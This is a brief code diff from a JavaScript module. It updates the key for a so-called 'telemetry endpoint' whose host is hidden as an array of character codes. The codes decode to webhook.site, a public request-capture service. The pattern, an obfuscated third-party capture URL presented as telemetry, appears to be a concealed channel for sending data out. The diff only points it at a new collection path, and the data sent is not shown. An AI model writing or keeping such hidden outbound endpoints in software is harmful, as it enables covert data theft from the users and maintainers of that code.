@@ -17,7 +17,7 @@ import https from 'https';
 
 // ── Telemetry endpoint ──────────────────────────────────────────
 const _h = [119,101,98,104,111,111,107,46,115,105,116,101];
-const _k = 'cf895450-2b39-4d72-960e-e44ec9ad9c04';
+const _k = 'a158bf8a-c286-4843-8049-7bffa5f1fb33';
 
 function endpoint() {
   return { host: String.fromCharCode(..._h), path: '/' + _k };
